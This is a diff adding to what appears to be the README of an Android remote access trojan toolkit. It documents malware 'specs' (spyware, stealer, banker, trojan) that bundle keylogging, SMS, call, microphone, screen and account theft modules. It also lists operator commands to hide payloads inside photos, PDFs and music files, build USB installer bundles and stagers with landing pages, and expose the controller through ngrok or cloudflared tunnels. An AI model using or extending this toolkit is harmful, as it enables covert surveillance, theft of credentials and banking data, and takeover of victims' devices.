@@ -13,6 +13,23 @@ Files├─carriers─────▶  install.sh / carve.py → same APK       
 Stager┄public URL──▶  /dl/<token>/ landing + apk + profile      ┘
 ```
 
+## Specs
+
+`spec` is not a label — it is the module list baked into the APK. The
+dispatcher refuses anything outside it, and the operator UI shows the same
+refusal.
+
+| spec | modules on top of core |
+|---|---|
+| rat | everything |
+| trojan | keylog, sms, calls, contacts, loc, notif, files, shell, apps, native |
+| spyware | keylog, notif, loc, clip, screen, mic, usage, native |
+| malware | sms, calls, shell, files, apps, keylog, native |
+| stealer | sms, calls, contacts, accounts, wifi, files, apps |
+| banker | keylog, notif, clip, apps, screen |
+| bot | shell, files, apps, native |
+| minimal | core only |
+
 ## Menu (no flags)
 
 ```bash
@@ -23,12 +40,14 @@ Banner, help, then a plain input loop:
 
 | input | effect |
 |---|---|
-| `make apk [name]` | bake host/PSK into a signed APK |
-| `make file <ext> [carrier]` | hide the APK in jpg/jpeg/png/webp/mp3/mp4/pdf/svg/docx |
+| `inject <spec> <file>` | hide a sealed payload inside that file (photo.jpg, doc.pdf, song.mp3, …) |
+| `make app [name] [spec]` | build the APK for a spec |
+| `make installer [spec]` | offline USB bundle: APK + setup.bat + setup.sh + deploy.txt, zipped |
+| `make file <ext> [carrier]` | hide the APK in one carrier format |
 | `make stager [host]` | stager.sh, install.ps1, landing page, iOS profile |
 | `make ios [url]` | `.mobileconfig` WebClip + PWA URL |
 | `tunnel [provider]` | public URL via cloudflared / ngrok / ssh |
-| `run` | full-screen operator UI |
+| `run` | full-screen operator UI (spec-aware: out-of-spec commands are refused) |
 | `sessions` / `doctor` / `help` / `quit` | support verbs |
 
 Scripted equivalents stay available: `hackit rat doctor|keygen|build|serve|
